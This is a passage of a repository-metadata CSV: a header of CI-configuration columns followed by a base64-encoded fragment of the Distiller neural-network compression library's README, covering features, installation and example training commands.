name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
b2IvbWFzdGVyL2p1cHl0ZXIvc2Vuc2l0aXZpdHlfYW5hbHlzaXMuaXB5bmIp
LgoqICoqUmVndWxhcml6YXRpb24qKgogIC0gTDEtbm9ybSBlbGVtZW50LXdp
c2UgcmVndWxhcml6YXRpb24KICAtIEdyb3VwIExhc3NvIGFuIGdyb3VwIHZh
cmlhbmNlIHJlZ3VsYXJpemF0aW9uICAgCiogKipRdWFudGl6YXRpb24qKgog
IC0gQXV0b21hdGljIG1lY2hhbmlzbSB0byB0cmFuc2Zvcm0gZXhpc3Rpbmcg
bW9kZWxzIHRvIHF1YW50aXplZCB2ZXJzaW9ucywgd2l0aCBjdXN0b21pemFi
bGUgYml0LXdpZHRoIGNvbmZpZ3VyYXRpb24gZm9yIGRpZmZlcmVudCBsYXll
cnMuIE5vIG5lZWQgdG8gcmUtd3JpdGUgdGhlIG1vZGVsIGZvciBkaWZmZXJl
bnQgcXVhbnRpemF0aW9uIG1ldGhvZHMuCiAgLSBbUG9zdC10cmFpbmluZyBx
dWFudGl6YXRpb25dKGh0dHBzOi8vbmVydmFuYXN5c3RlbXMuZ2l0aHViLmlv
L2Rpc3RpbGxlci91c2FnZS9pbmRleC5odG1sIyNwb3N0LXRyYWluaW5nLXF1
YW50aXphdGlvbikgb2YgdHJhaW5lZCBmdWxsLXByZWNpc2lvbiBtb2RlbHMs
IGR5bmFtaWMgYW5kIHN0YXRpYyAoc3RhdGlzdGljcy1iYXNlZCkKICAtIFN1
cHBvcnQgZm9yIFtxdWFudGl6YXRpb24tYXdhcmUgdHJhaW5pbmddKGh0dHBz
Oi8vbmVydmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9hbGdvX3F1
YW50aXphdGlvbi5odG1sI3F1YW50aXphdGlvbi1hd2FyZS10cmFpbmluZykg
aW4gdGhlIGxvb3AKKiAqKktub3dsZWRnZSBkaXN0aWxsYXRpb24qKgogIC0g
VHJhaW5pbmcgd2l0aCBba25vd2xlZGdlIGRpc3RpbGxhdGlvbl0oaHR0cHM6
Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIuaW8vZGlzdGlsbGVyL2tub3dsZWRn
ZV9kaXN0aWxsYXRpb24uaHRtbCksIGluIGNvbmp1bmN0aW9uIHdpdGggdGhl
IG90aGVyIGF2YWlsYWJsZSBwcnVuaW5nIC8gcmVndWxhcml6YXRpb24gLyBx
dWFudGl6YXRpb24gbWV0aG9kcy4KKiAqKkNvbmRpdGlvbmFsIGNvbXB1dGF0
aW9uKioKICAtIFNhbXBsZSBpbXBsZW1lbnRhdGlvbiBvZiBFYXJseSBFeGl0
CiogKipMb3cgcmFuayBkZWNvbXBvc2l0aW9uKioKICAtIFNhbXBsZSBpbXBs
ZW1lbnRhdGlvbiBvZiBbdHJ1bmNhdGVkIFNWRF0oaHR0cHM6Ly9naXRodWIu
Y29tL05lcnZhbmFTeXN0ZW1zL2Rpc3RpbGxlci9ibG9iL21hc3Rlci9qdXB5
dGVyL3RydW5jYXRlZF9zdmQuaXB5bmIpCiogTG90dGVyeSBUaWNrZXQgSHlw
b3RoZXNpcyB0cmFpbmluZyAKKiBFeHBvcnQgc3RhdGlzdGljcyBzdW1tYXJp
ZXMgdXNpbmcgUGFuZGFzIGRhdGFmcmFtZXMsIHdoaWNoIG1ha2VzIGl0IGVh
c3kgdG8gc2xpY2UsIHF1ZXJ5LCBkaXNwbGF5IGFuZCBncmFwaCB0aGUgZGF0
YS4KKiBBIHNldCBvZiBbSnVweXRlciBub3RlYm9va3NdKGh0dHBzOi8vbmVy
dmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9qdXB5dGVyL2luZGV4
Lmh0bWwpIHRvIHBsYW4gZXhwZXJpbWVudHMgYW5kIGFuYWx5emUgY29tcHJl
c3Npb24gcmVzdWx0cy4gIFRoZSBncmFwaHMgYW5kIHZpc3VhbGl6YXRpb25z
IHlvdSBzZWUgb24gdGhpcyBwYWdlIG9yaWdpbmF0ZSBmcm9tIHRoZSBpbmNs
dWRlZCBKdXB5dGVyIG5vdGVib29rcy4gIAogICsgVGFrZSBhIGxvb2sgYXQg
W3RoaXMgbm90ZWJvb2tdKGh0dHBzOi8vZ2l0aHViLmNvbS9OZXJ2YW5hU3lz
dGVtcy9kaXN0aWxsZXIvYmxvYi9tYXN0ZXIvanVweXRlci9hbGV4bmV0X2lu
c2lnaHRzLmlweW5iKSwgd2hpY2ggY29tcGFyZXMgdmlzdWFsIGFzcGVjdHMg
b2YgZGVuc2UgYW5kIHNwYXJzZSBBbGV4bmV0IG1vZGVscy4KICArIFtUaGlz
IG5vdGVib29rXShodHRwczovL2dpdGh1Yi5jb20vTmVydmFuYVN5c3RlbXMv
ZGlzdGlsbGVyL2Jsb2IvbWFzdGVyL2p1cHl0ZXIvbW9kZWxfc3VtbWFyeS5p
cHluYikgY3JlYXRlcyBwZXJmb3JtYW5jZSBpbmRpY2F0b3IgZ3JhcGhzIGZy
b20gbW9kZWwgZGF0YS4KKiBTYW1wbGUgaW1wbGVtZW50YXRpb25zIG9mIHB1
Ymxpc2hlZCByZXNlYXJjaCBwYXBlcnMsIHVzaW5nIGxpYnJhcnktcHJvdmlk
ZWQgYnVpbGRpbmcgYmxvY2tzLiAgU2VlIHRoZSAgcmVzZWFyY2ggcGFwZXJz
IGRpc2N1c3Npb25zIGluIG91ciBbbW9kZWwtem9vXShodHRwczovL25lcnZh
bmFzeXN0ZW1zLmdpdGh1Yi5pby9kaXN0aWxsZXIvbW9kZWxfem9vLmh0bWwp
LgoqIExvZ2dpbmcgdG8gdGhlIGNvbnNvbGUsIHRleHQgZmlsZSBhbmQgVGVu
c29yQm9hcmQtZm9ybWF0dGVkIGZpbGUuCiogRXhwb3J0IHRvICoqT05OWCoq
IChleHBvcnQgb2YgcXVhbnRpemVkIG1vZGVscyBwZW5kaW5nIE9OTlggc3Rh
bmRhcmRpemF0aW9uKQoKIyMgSW5zdGFsbGF0aW9uCgpUaGVzZSBpbnN0cnVj
dGlvbnMgd2lsbCBoZWxwIGdldCBEaXN0aWxsZXIgdXAgYW5kIHJ1bm5pbmcg
b24geW91ciBsb2NhbCBtYWNoaW5lLgoxLiBbQ2xvbmUgRGlzdGlsbGVyXSgj
Y2xvbmUtZGlzdGlsbGVyKQoyLiBbQ3JlYXRlIGEgUHl0aG9uIHZpcnR1YWwg
ZW52aXJvbm1lbnRdKCNjcmVhdGUtYS1weXRob24tdmlydHVhbC1lbnZpcm9u
bWVudCkKMy4gW0luc3RhbGwgdGhlIHBhY2thZ2VdKCNpbnN0YWxsLXRoZS1w
YWNrYWdlKQoKTm90ZXM6Ci0gRGlzdGlsbGVyIGhhcyBvbmx5IGJlZW4gdGVz
dGVkIG9uIFVidW50dSAxNi4wNCBMVFMsIGFuZCB3aXRoIFB5dGhvbiAzLjUu
Ci0gSWYgeW91IGFyZSBub3QgdXNpbmcgYSBHUFUsIHlvdSBtaWdodCBuZWVk
IHRvIG1ha2Ugc21hbGwgYWRqdXN0bWVudHMgdG8gdGhlIGNvZGUuCgojIyMg
Q2xvbmUgRGlzdGlsbGVyCkNsb25lIHRoZSBEaXN0aWxsZXIgY29kZSByZXBv
c2l0b3J5IGZyb20gZ2l0aHViOgpgYGAKJCBnaXQgY2xvbmUgaHR0cHM6Ly9n
aXRodWIuY29tL05lcnZhbmFTeXN0ZW1zL2Rpc3RpbGxlci5naXQKYGBgClRo
ZSByZXN0IG9mIHRoZSBkb2N1bWVudGF0aW9uIHRoYXQgZm9sbG93cywgYXNz
dW1lcyB0aGF0IHlvdSBoYXZlIGNsb25lZCB5b3VyIHJlcG9zaXRvcnkgdG8g
YSBkaXJlY3RvcnkgY2FsbGVkIGBgYGRpc3RpbGxlcmBgYC4gPGJyPgoKIyMj
IENyZWF0ZSBhIFB5dGhvbiB2aXJ0dWFsIGVudmlyb25tZW50CldlIHJlY29t
bWVuZCB1c2luZyBhIFtQeXRob24gdmlydHVhbCBlbnZpcm9ubWVudF0oaHR0
cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L3ZlbnYuaHRtbCN2ZW52
LWRlZiksIGJ1dCB0aGF0IG9mIGNvdXJzZSwgaXMgdXAgdG8geW91LgpUaGVy
ZSdzIG5vdGhpbmcgc3BlY2lhbCBhYm91dCB1c2luZyBEaXN0aWxsZXIgaW4g
YSB2aXJ0dWFsIGVudmlyb25tZW50LCBidXQgd2UgcHJvdmlkZSBzb21lIGlu
c3RydWN0aW9ucywgZm9yIGNvbXBsZXRlbmVzcy48YnI+CkJlZm9yZSBjcmVh
dGluZyB0aGUgdmlydHVhbCBlbnZpcm9ubWVudCwgbWFrZSBzdXJlIHlvdSBh
cmUgbG9jYXRlZCBpbiBkaXJlY3RvcnkgYGBgZGlzdGlsbGVyYGBgLiAgQWZ0
ZXIgY3JlYXRpbmcgdGhlIGVudmlyb25tZW50LCB5b3Ugc2hvdWxkIHNlZSBh
IGRpcmVjdG9yeSBjYWxsZWQgYGBgZGlzdGlsbGVyL2VudmBgYC4KPGJyPgoj
IyMjIFVzaW5nIHZpcnR1YWxlbnYKSWYgeW91IGRvbid0IGhhdmUgdmlydHVh
bGVudiBpbnN0YWxsZWQsIHlvdSBjYW4gZmluZCB0aGUgaW5zdGFsbGF0aW9u
IGluc3RydWN0aW9ucyBbaGVyZV0oaHR0cHM6Ly9wYWNrYWdpbmcucHl0aG9u
Lm9yZy9ndWlkZXMvaW5zdGFsbGluZy11c2luZy1waXAtYW5kLXZpcnR1YWxl
bnYvKS4KClRvIGNyZWF0ZSB0aGUgZW52aXJvbm1lbnQsIGV4ZWN1dGU6CmBg
YAokIHB5dGhvbjMgLW0gdmlydHVhbGVudiBlbnYKYGBgClRoaXMgY3JlYXRl
cyBhIHN1YmRpcmVjdG9yeSBuYW1lZCBgYGBlbnZgYGAgd2hlcmUgdGhlIHB5
dGhvbiB2aXJ0dWFsIGVudmlyb25tZW50IGlzIHN0b3JlZCwgYW5kIGNvbmZp
Z3VyZXMgdGhlIGN1cnJlbnQgc2hlbGwgdG8gdXNlIGl0IGFzIHRoZSBkZWZh
dWx0IHB5dGhvbiBlbnZpcm9ubWVudC4KCiMjIyMgVXNpbmcgdmVudgpJZiB5
b3UgcHJlZmVyIHRvIHVzZSBgYGB2ZW52YGBgLCB0aGVuIGJlZ2luIGJ5IGlu
c3RhbGxpbmcgaXQ6CmBgYAokIHN1ZG8gYXB0LWdldCBpbnN0YWxsIHB5dGhv
bjMtdmVudgpgYGAKVGhlbiBjcmVhdGUgdGhlIGVudmlyb25tZW50OgpgYGAK
JCBweXRob24zIC1tIHZlbnYgZW52CmBgYApBcyB3aXRoIHZpcnR1YWxlbnYs
IHRoaXMgY3JlYXRlcyBhIGRpcmVjdG9yeSBjYWxsZWQgYGBgZGlzdGlsbGVy
L2VudmBgYC48YnI+CgojIyMjIEFjdGl2YXRlIHRoZSBlbnZpcm9ubWVudApU
aGUgZW52aXJvbm1lbnQgYWN0aXZhdGlvbiBhbmQgZGVhY3RpdmF0aW9uIGNv
bW1hbmRzIGZvciBgYGB2ZW52YGBgIGFuZCBgYGB2aXJ0dWFsZW52YGBgIGFy
ZSB0aGUgc2FtZS48YnI+CioqIU5PVEU6IE1ha2Ugc3VyZSB0byBhY3RpdmF0
ZSB0aGUgZW52aXJvbm1lbnQsIGJlZm9yZSBwcm9jZWVkaW5nIHdpdGggdGhl
IGluc3RhbGxhdGlvbiBvZiB0aGUgZGVwZW5kZW5jeSBwYWNrYWdlczo8YnI+
KioKYGBgCiQgc291cmNlIGVudi9iaW4vYWN0aXZhdGUKYGBgCgojIyMgSW5z
dGFsbCB0aGUgcGFja2FnZQoKRmluYWxseSwgaW5zdGFsbCB0aGUgRGlzdGls
bGVyIHBhY2thZ2UgYW5kIGl0cyBkZXBlbmRlbmNpZXMgdXNpbmcgYGBgcGlw
M2BgYDoKYGBgCiQgY2QgZGlzdGlsbGVyCiQgcGlwMyBpbnN0YWxsIC1lIC4K
YGBgClRoaXMgaW5zdGFsbHMgRGlzdGlsbGVyIGluICJkZXZlbG9wbWVudCBt
b2RlIiwgbWVhbmluZyBhbnkgY2hhbmdlcyBtYWRlIGluIHRoZSBjb2RlIGFy
ZSByZWZsZWN0ZWQgaW4gdGhlIGVudmlyb25tZW50IHdpdGhvdXQgcmUtcnVu
bmluZyB0aGUgaW5zdGFsbCBjb21tYW5kIChzbyBubyBuZWVkIHRvIHJlLWlu
c3RhbGwgYWZ0ZXIgcHVsbGluZyBjaGFuZ2VzIGZyb20gdGhlIEdpdCByZXBv
c2l0b3J5KS4KCiMjIyBSZXF1aXJlZCBQeVRvcmNoIFZlcnNpb24KCkRpc3Rp
bGxlciBpcyB0ZXN0ZWQgdXNpbmcgdGhlIGRlZmF1bHQgaW5zdGFsbGF0aW9u
IG9mIFB5VG9yY2ggMS4zLjEsIHdoaWNoIHVzZXMgQ1VEQSAxMC4xLiBXZSB1
c2UgVG9yY2hWaXNpb24gdmVyc2lvbiAwLjQuMi4gVGhlc2UgYXJlIGluY2x1
ZGVkIGluIERpc3RpbGxlcidzIGByZXF1aXJlbWVudHMudHh0YCBhbmQgd2ls
bCBiZSBhdXRvbWF0aWNhbGx5IGluc3RhbGxlZCB3aGVuIGluc3RhbGxpbmcg
dGhlIERpc3RpbGxlciBwYWNrYWdlIGFzIGxpc3RlZCBhYm92ZS4KCklmIHlv
dSBkbyBub3QgdXNlIENVREEgMTAuMSBpbiB5b3VyIGVudmlyb25tZW50LCBw
bGVhc2UgcmVmZXIgdG8gW1B5VG9yY2ggd2Vic2l0ZV0oaHR0cHM6Ly9weXRv
cmNoLm9yZy9nZXQtc3RhcnRlZC9sb2NhbGx5LykgdG8gaW5zdGFsbCB0aGUg
Y29tcGF0aWJsZSBidWlsZCBvZiBQeVRvcmNoIDEuMy4xIGFuZCB0b3JjaHZp
c2lvbiAwLjQuMi4KCiMjIEdldHRpbmcgU3RhcnRlZAoKWW91IGNhbiBqdW1w
IGhlYWQtZmlyc3QgaW50byBzb21lIGxpbWl0ZWQgZXhhbXBsZXMgb2YgbmV0
d29yayBjb21wcmVzc2lvbiwgdG8gZ2V0IGEgZmVlbGluZyBmb3IgdGhlIGxp
YnJhcnkgd2l0aG91dCB0b28gbXVjaCBpbnZlc3RtZW50IG9uIHlvdXIgcGFy
dC4gIAoKRGlzdGlsbGVyIGNvbWVzIHdpdGggYSBzYW1wbGUgYXBwbGljYXRp
b24gZm9yIGNvbXByZXNzaW5nIGltYWdlIGNsYXNzaWZpY2F0aW9uIEROTnMs
IGBgYGNvbXByZXNzX2NsYXNzaWZpZXIucHlgYGAgbG9jYXRlZCBhdCBgYGBk
aXN0aWxsZXIvZXhhbXBsZXMvY2xhc3NpZmllcl9jb21wcmVzc2lvbmBgYC4K
CldlJ2xsIHNob3cgeW91IGhvdyB0byB1c2UgaXQgZm9yIHNvbWUgc2ltcGxl
IHVzZS1jYXNlcywgYW5kIHdpbGwgcG9pbnQgeW91IHRvIHNvbWUgcmVhZHkt
dG8tZ28gSnVweXRlciBub3RlYm9va3MuCgpGb3IgbW9yZSBkZXRhaWxzLCB0
aGVyZSBhcmUgc29tZSBvdGhlciByZXNvdXJjZXMgeW91IGNhbiByZWZlciB0
bzoKKyBbRnJlcXVlbnRseS1hc2tlZCBxdWVzdGlvbnMgKEZBUSldKGh0dHBz
Oi8vZ2l0aHViLmNvbS9OZXJ2YW5hU3lzdGVtcy9kaXN0aWxsZXIvd2lraS9G
cmVxdWVudGx5LUFza2VkLVF1ZXN0aW9ucy0oRkFRKSkKKyBbTW9kZWwgem9v
XShodHRwczovL25lcnZhbmFzeXN0ZW1zLmdpdGh1Yi5pby9kaXN0aWxsZXIv
bW9kZWxfem9vLmh0bWwpCisgW0NvbXByZXNzaW9uIHNjaGVkdWxpbmddKGh0
dHBzOi8vbmVydmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9zY2hl
ZHVsZS5odG1sKQorIFtVc2FnZV0oaHR0cHM6Ly9uZXJ2YW5hc3lzdGVtcy5n
aXRodWIuaW8vZGlzdGlsbGVyL3VzYWdlLmh0bWwpCisgW1ByZXBhcmluZyBh
IG1vZGVsIGZvciBxdWFudGl6YXRpb25dKGh0dHBzOi8vbmVydmFuYXN5c3Rl
bXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9wcmVwYXJlX21vZGVsX3F1YW50Lmh0
bWwpCisgW1R1dG9yaWFsOiBVc2luZyBEaXN0aWxsZXIgdG8gcHJ1bmUgYSBQ
eVRvcmNoIGxhbmd1YWdlIG1vZGVsXShodHRwczovL25lcnZhbmFzeXN0ZW1z
LmdpdGh1Yi5pby9kaXN0aWxsZXIvdHV0b3JpYWwtbGFuZ19tb2RlbC5odG1s
KQorIFtUdXRvcmlhbDogUHJ1bmluZyBGaWx0ZXJzICYgQ2hhbm5lbHNdKGh0
dHBzOi8vbmVydmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci90dXRv
cmlhbC1zdHJ1Y3RfcHJ1bmluZy5odG1sKQorIFtUdXRvcmlhbDogUG9zdC1U
cmFpbmluZyBRdWFudGl6YXRpb24gb2YgYSBMYW5ndWFnZSBNb2RlbF0oaHR0
cHM6Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIuaW8vZGlzdGlsbGVyL3R1dG9y
aWFsLWxhbmdfbW9kZWxfcXVhbnQuaHRtbCkKKyBbVHV0b3JpYWw6IFBvc3Qt
VHJhaW5pbmcgUXVhbnRpemF0aW9uIG9mIEdOTVQgKHRyYW5zbGF0aW9uIG1v
ZGVsKV0oaHR0cHM6Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIuaW8vZGlzdGls
bGVyL3R1dG9yaWFsLWdubXRfcXVhbnQuaHRtbCkKKyBbUG9zdC10cmFpbmlu
ZyBxdWFudGl6YXRpb24gY29tbWFuZCBsaW5lIGV4YW1wbGVzXShodHRwczov
L2dpdGh1Yi5jb20vTmVydmFuYVN5c3RlbXMvZGlzdGlsbGVyL2Jsb2IvbWFz
dGVyL2V4YW1wbGVzL3F1YW50aXphdGlvbi9wb3N0X3RyYWluX3F1YW50L2Nv
bW1hbmRfbGluZS5tZCkKCiMjIyBFeGFtcGxlIGludm9jYXRpb25zIG9mIHRo
ZSBzYW1wbGUgYXBwbGljYXRpb24KKyBbVHJhaW5pbmctb25seV0oI3RyYWlu
aW5nLW9ubHkpCisgW0dldHRpbmcgcGFyYW1ldGVyIHN0YXRpc3RpY3Mgb2Yg
YSBzcGFyc2lmaWVkIG1vZGVsXSgjZ2V0dGluZy1wYXJhbWV0ZXItc3RhdGlz
dGljcy1vZi1hLXNwYXJzaWZpZWQtbW9kZWwpCisgW1Bvc3QtdHJhaW5pbmcg
cXVhbnRpemF0aW9uXSgjcG9zdC10cmFpbmluZy1xdWFudGl6YXRpb24pCgoj
IyMjIFRyYWluaW5nLW9ubHkKVGhlIGZvbGxvd2luZyB3aWxsIGludm9rZSB0
cmFpbmluZy1vbmx5IChubyBjb21wcmVzc2lvbikgb2YgYSBuZXR3b3JrIG5h
bWVkICdzaW1wbGVuZXQnIG9uIHRoZSBDSUZBUjEwIGRhdGFzZXQuICBUaGlz
IGlzIHJvdWdobHkgYmFzZWQgb24gVG9yY2hWaXNpb24ncyBzYW1wbGUgSW1h
Z2VuZXQgdHJhaW5pbmcgYXBwbGljYXRpb24sIHNvIGl0IHNob3VsZCBsb29r
IGZhbWlsaWFyIGlmIHlvdSd2ZSB1c2VkIHRoYXQgYXBwbGljYXRpb24uICBJ
biAgdGhpcyBleGFtcGxlIHdlIGRvbid0IGludm9rZSBhbnkgY29tcHJlc3Np
b24gbWVjaGFuaXNtczogd2UganVzdCB0cmFpbiBiZWNhdXNlIGZvciBmaW5l
LXR1bmluZyBhZnRlciBwcnVuaW5nLCB0cmFpbmluZyBpcyBhbiBlc3NlbnRp
YWwgcGFydC48YnI+ICAKTm90ZSB0aGF0IHRoZSBmaXJzdCB0aW1lIHlvdSBl
eGVjdXRlIHRoaXMgY29tbWFuZCwgdGhlIENJRkFSMTAgY29kZSB3aWxsIGJl
IGRvd25sb2FkZWQgdG8geW91ciBtYWNoaW5lLCB3aGljaCBtYXkgdGFrZSBh
IGJpdCBvZiB0aW1lIC0gcGxlYXNlIGxldCB0aGUgZG93bmxvYWQgcHJvY2Vz
cyBwcm9jZWVkIHRvIGNvbXBsZXRpb24uCgpUaGUgcGF0aCB0byB0aGUgQ0lG
QVIxMCBkYXRhc2V0IGlzIGFyYml0cmFyeSwgYnV0IGluIG91ciBleGFtcGxl
cyB3ZSBwbGFjZSB0aGUgZGF0YXNldHMgaW4gdGhlIHNhbWUgZGlyZWN0b3J5
IGxldmVsIGFzIGRpc3RpbGxlciAoaS5lLiBgYGAuLi8uLi8uLi9kYXRhLmNp
ZmFyMTBgYGApLgoKRmlyc3QsIGNoYW5nZSB0byB0aGUgc2FtcGxlIGRpcmVj
dG9yeSwgdGhlbiBpbnZva2UgdGhlIGFwcGxpY2F0aW9uOgpgYGAKJCBjZCBk
aXN0aWxsZXIvZXhhbXBsZXMvY2xhc3NpZmllcl9jb21wcmVzc2lvbgokIHB5
dGhvbjMgY29tcHJlc3NfY2xhc3NpZmllci5weSAtLWFyY2ggc2ltcGxlbmV0
X2NpZmFyIC4uLy4uLy4uL2RhdGEuY2lmYXIxMCAtcCAzMCAtaj0xIC0tbHI9
MC4wMQpgYGAKCllvdSBjYW4gdXNlIGEgVGVuc29yQm9hcmQgYmFja2VuZCB0
byB2aWV3IHRoZSB0cmFpbmluZyBwcm9ncmVzcyAoaW4gdGhlIGRpYWdyYW0g
YmVsb3cgd2Ugc2hvdyBhIGNvdXBsZSBvZiB0cmFpbmluZyBzZXNzaW9ucyB3
aXRoIGRpZmZlcmVudCBMUiB2YWx1ZXMpLiAgRm9yIGNvbXByZXNzaW9uIHNl
c3Npb25zLCB3ZSd2ZSBhZGRlZCB0cmFjaW5nIG9mIGFjdGl2YXRpb24gYW5k
IHBhcmFtZXRlciBzcGFyc2l0eSBsZXZlbHMsIGFuZCByZWd1bGFyaXphdGlv
biBsb3NzLgo8Y2VudGVyPiA8aW1nIHNyYz0iaW1ncy9zaW1wbGVuZXRfdHJh
aW5pbmcucG5nIj48L2NlbnRlcj4KCgojIyMjIEdldHRpbmcgcGFyYW1ldGVy
IHN0YXRpc3RpY3Mgb2YgYSBzcGFyc2lmaWVkIG1vZGVsCldlJ3ZlIGluY2x1
ZGVkIGluIHRoZSBnaXQgcmVwb3NpdG9yeSBhIGZldyBjaGVja3BvaW50cyBv
ZiBhIFJlc05ldDIwIG1vZGVsIHRoYXQgd2UndmUgdHJhaW5lZCB3aXRoIDMy
LWJpdCBmbG9hdHMuICBMZXQncyBsb2FkIHRoZSBjaGVja3BvaW50IG9mIGEg
bW9kZWwgdGhhdCB3ZSd2ZSB0cmFpbmVkIHdpdGggY2hhbm5lbC13aXNlIEdy
b3VwIExhc3NvIHJlZ3VsYXJpemF0aW9uLjxicj4KV2l0aCB0aGUgZm9sbG93
aW5nIGNvbW1hbmQtbGluZSBhcmd1bWVudHMsIHRoZSBzYW1wbGUgYXBwbGlj
YXRpb24gbG9hZHMgdGhlIG1vZGVsIChgYGAtLXJlc3VtZWBgYCkgIGFuZCBw
cmludHMgc3RhdGlzdGljcyBhYm91dCB0aGUgbW9kZWwgd2VpZ2h0cyAoYGBg
LS1zdW1tYXJ5PXNwYXJzaXR5YGBgKS4gIFRoaXMgaXMgdXNlZnVsIGlmIHlv
dSB3YW50IHRvIGxvYWQgYSBwcmV2aW91c2x5IHBydW5lZCBtb2RlbCwgdG8g
ZXhhbWluZSB0aGUgd2VpZ2h0cyBzcGFyc2l0eSBzdGF0aXN0aWNzLCBmb3Ig
ZXhhbXBsZS4gIE5vdGUgdGhhdCB3aGVuIHlvdSAqcmVzdW1lKiBhIHN0b3Jl
ZCBjaGVja3BvaW50LCB5b3Ugc3RpbGwgbmVlZCB0byB0ZWxsIHRoZSBhcHBs
aWNhdGlvbiB3aGljaCBuZXR3b3JrIGFyY2hpdGVjdHVyZSB0aGUgY2hlY2tw
b2ludCB1c2VzIChgYGAtYT1yZXNuZXQyMF9jaWZhcmBgYCk6CmBgYAokIHB5
dGhvbjMgY29tcHJlc3NfY2xhc3NpZmllci5weSAtLXJlc3VtZT0uLi9zc2wv
Y2hlY2twb2ludHMvY2hlY2twb2ludF90cmFpbmVkX2NoX3JlZ3VsYXJpemVk
X2RlbnNlLnB0aC50YXIgLWE9cmVzbmV0MjBfY2lmYXIgLi4vLi4vLi4vZGF0
YS5jaWZhcjEwIC0tc3VtbWFyeT1zcGFyc2l0eQpgYGAKPGNlbnRlcj4gPGlt
ZyBzcmM9ImltZ3MvY2hfc3BhcnNpdHlfc3RhdHMucG5nIj48L2NlbnRlcj4K
CllvdSBzaG91bGQgc2VlIGEgdGV4dCB0YWJsZSBkZXRhaWxpbmcgdGhlIHZh
cmlvdXMgc3BhcnNpdGllcyBvZiB0aGUgcGFyYW1ldGVyIHRlbnNvcnMuICBU
aGUgZmlyc3QgY29sdW1uIGlzIHRoZSBwYXJhbWV0ZXIgbmFtZSwgZm9sbG93
ZWQgYnkgaXRzIHNoYXBlLCB0aGUgbnVtYmVyIG9mIG5vbi16ZXJvIGVsZW1l
bnRzIChOTlopIGluIHRoZSBkZW5zZSBtb2RlbCwgYW5kIGluIHRoZSBzcGFy
c2UgbW9kZWwuICBUaGUgbmV4dCBzZXQgb2YgY29sdW1ucyBzaG93IHRoZSBj
b2x1bW4td2lzZSwgcm93LXdpc2UsIGNoYW5uZWwtd2lzZSwga2VybmVsLXdp
c2UsIGZpbHRlci13aXNlIGFuZCBlbGVtZW50LXdpc2Ugc3BhcnNpdGllcy4K
PGJyPgpXcmFwcGluZyBpdCB1cCBhcmUgdGhlIHN0YW5kYXJkLWRldmlhdGlv
biwgbWVhbiwgYW5kIG1lYW4gb2YgYWJzb2x1dGUgdmFsdWVzIG9mIHRoZSBl
bGVtZW50cy4KCkluIHRoZSBbQ29tcHJlc3Npb24gSW5zaWdodHMgbm90ZWJv
b2tdKGh0dHBzOi8vZ2l0aHViLmNvbS9OZXJ2YW5hU3lzdGVtcy9kaXN0aWxs
ZXIvYmxvYi9tYXN0ZXIvanVweXRlci9jb21wcmVzc2lvbl9pbnNpZ2h0cy5p
cHluYikgd2UgdXNlIG1hdHBsb3RsaWIgdG8gcGxvdCBhIGJhciBjaGFydCBv
ZiB0aGlzIHN1bW1hcnksIHRoYXQgaW5kZWVkIHNob3cgbm9uLWltcHJlc3Np
